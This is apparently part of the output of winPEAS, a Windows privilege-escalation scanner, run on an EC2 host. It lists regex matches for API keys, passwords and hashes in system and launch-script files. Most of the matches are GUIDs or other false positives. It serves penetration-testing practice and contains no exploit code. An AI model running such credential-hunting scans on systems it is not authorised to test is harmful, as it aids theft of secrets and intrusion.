C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba48e8                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0a62b                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385cd04                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 633bd6e8-0f50-4e28-b330-cc22fa995702                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d2fce                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03b1b9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba48e8                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0a62b                                                                                                                       

����������͹ Found APIs-Sendbird Access ID Regexes
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385cd04                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 6bdd1fc6-810f-11d0-bec7-08002be2092f                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d2fce                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03b1b9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba48e8                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0a62b                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385cd04                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 633bd6e8-0f50-4e28-b330-cc22fa995702                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d2fce                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03b1b9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba48e8                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0a62b                                                                                                                       

����������͹ Found APIs-Artifactory Password Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\New-WallpaperSetup.ps1: APFaBhPbrLXkvf9y83BACFfNQ

����������͹ Found APIs-Hubspot API Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-HibernateOnSleep.ps1: "96996bc0-ad50-47ec-923b-6f41874dd9eb"

����������͹ Found APIs-ORB Intelligence Access Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-HibernateOnSleep.ps1: "96996bc0-ad50-47ec-923b-6f41874dd9eb"

����������͹ Found APIs-URLScan API Key Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-HibernateOnSleep.ps1: "96996bc0-ad50-47ec-923b-6f41874dd9eb"

����������͹ Found Misc-IPs Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2.2.0.0
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 00.2.0.0

����������͹ Found Misc-Config Secrets Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1: $env:

����������͹ Found Misc-Code asigning passwords Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1: PASSWORDCHG:NO /EXPIRES:NEVER /PASSWORDREQ:NO                                                                                                                        

����������͹ Found Misc-Simple Passwords Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-AdminAccount.ps1: password = Get-LaunchConfig -Key AdminPassword -Delete                                                                                                                    
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-AdminAccount.ps1: password = ""
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-AdminAccount.ps1: password = New-RandomPassword
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-AdminAccount.ps1: password /ACTIVE:YES /LOGONPASSWORDCHG:NO /EXPIRES:NEVER /PASSWORDREQ:YES                                                                                                 
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-AdminAccount.ps1: password: {0}" -f $_.Exception.Message)
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Set-AdminAccount.ps1: password = ""

����������͹ Found Raw Hashes-md5 Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: >2521bc6f9fbed149023ba5a35c30a580<
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: >d175b1f47d57cc41e8298c39beccaa96<

       /---------------------------------------------------------------------------------\                                    
       |                             Do you like PEASS?                                  |                                    
       |---------------------------------------------------------------------------------|                                    
       |         Follow on Twitter         :     @hacktricks_live                        |                                    
       |         Respect on HTB            :     SirBroccoli                             |                                    
       |---------------------------------------------------------------------------------|                                    
       |                                 Thank you!                                      |                                    
       \---------------------------------------------------------------------------------/                                    
                                                                                                                              


```